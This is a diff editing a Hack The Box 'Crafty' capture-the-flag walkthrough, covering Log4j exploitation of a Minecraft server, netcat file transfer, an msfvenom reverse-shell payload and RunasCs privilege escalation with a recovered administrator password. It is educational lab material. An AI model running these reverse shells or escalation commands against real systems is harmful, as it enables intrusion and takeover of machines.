@@ -62,7 +62,7 @@ When we go to the website we find a web page about a game called Crafty.
 
 ![Crafty website](/images/HTB-Crafty/crafty-webpage.png)
 
-There is nothing interesting on the web application so far. I turned my attention to the Minecraft server. When searching `minecraft 1.16.5 vulnerability` we find that there is a Log4j exploit for it with [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
+There is nothing interesting on the web application so we turn our attention to the Minecraft server. When searching `minecraft 1.16.5 vulnerability` we find that there is a Log4j exploit for it with [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).
 
 > `play.crafty.htb` redirects us to the main website.
 
@@ -78,7 +78,7 @@ After checking the content of `poc.py` we notice that it is using `String cmd="/
 
 On the exploit page, we read: "**Note:** For this to work, the extracted java archive has to be named: `jdk1.8.0_20`, and be in the same directory."
 
-Going to the website provided on the Github page we are required to create an account. After searching around we found some java archives on https://repo.huaweicloud.com/java/.
+Going to the website provided on the Github page we are required to create an account. After searching around we find some java archives on https://repo.huaweicloud.com/java/.
 
 For a quick download and setup use the commands below.
 
@@ -127,12 +127,6 @@ python3 poc.py --userip <IP_ADDRESS> --webport 80 --lport <PORT_NUMBER>
 From the `PyCraft` folder we run `start.py`
 
 ```
-virtualenv ENV
-
-source ENV/bin/activate
-
-pip install -r requirements.txt
-
 python3 start.py
 ```
 
@@ -152,7 +146,7 @@ The user flag is on the user desktop.
 
 In `c:\Users\svc_minecraft\server\plugins\` we find an archive named `playercounter-1.0-SNAPSHOT.jar`.
 
-To send that file to our local machine we used `nc.exe` (Netcat for Windows)
+To send that file to our local machine we use `nc.exe` (Netcat for Windows)
 
 1. Download `nc.exe` with 
 
@@ -162,7 +156,7 @@ wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
 
 2. Move into the `netcat-1.11` directory created after the extraction
 
-3. Start a Python server
+3. Start a web server with Python
 
 ```
 python3 -m http.server
@@ -200,7 +194,7 @@ We find what looks like some credential (`s67u84zKq8IXw`) used when connecting t
 
 ![archive content credentials](/images/HTB-Crafty/playercount-file.png)
 
-We have a tool called [RunasCs](https://github.com/antonioCoco/RunasCs) that enables us to execute processes with permissions different from our current user's. Our objective is to launch an Administrator shell from the current user `svc_minecraft`.
+We have a tool called [RunasCs](https://github.com/antonioCoco/RunasCs) that enables us to execute processes with permissions different from our current user's. Our objective is to get an Administrator shell from the current user `svc_minecraft`.
 
 Let's generate a payload with `msfvenom`.
 
@@ -214,13 +208,13 @@ msfvenom -p windows/x64/shell_reverse_tcp lhost=<YOUR IP ADDRESS> lport=<PORT NU
 
 ![malicious file and runascs.exe on target](/images/HTB-Crafty/files-on-target.png)
 
-We setup another listener on the port selected for your `msfvenom` payload.
+We setup another listener on the port selected for the `msfvenom` payload.
 
 ```
 rlwrap -cAr nc -lvp <PORT_NUMBER>
 ```
 
-We then use `runasCs` in conjunction with the payload.
+We then use `runasCs` in conjunction with the malicious file.
 
 ```
 .\runasCs.exe administrator s67u84zKq8IXw shell.exe --bypass-uac
@@ -234,10 +228,12 @@ At `C:\Users\Administrator\Desktop` we find `root.txt`.
 
 ![root flag](/images/HTB-Crafty/root-flag.png)
 
-The Log4j vulnerability is pretty popular because it allows attackers to easily take full control of vulnerable systems. If you want to read more about it, here are a couple of articles:
+## Closing Words
 
+Log4j is considered one of the most severe vulnerability because it allows attackers to easily take over vulnerable systems. It is very important to be able to recognize and test for those popular vulnerabilities. If you want to learn more about it, below are a video and an article detailing it:
+
+* [Apache Log4j: The Exploit that Almost Killed the Internet](https://www.youtube.com/watch?v=UhuL11JaECM&ab_channel=IntotheShadows)
 * [Log4J Vulnerability Explained: What It Is and How to Fix It](https://builtin.com/articles/log4j-vulerability-explained)
-* [Log4j vulnerability - what everyone needs to know](https://www.ncsc.gov.uk/information/log4j-vulnerability-what-everyone-needs-to-know)
 
 
 
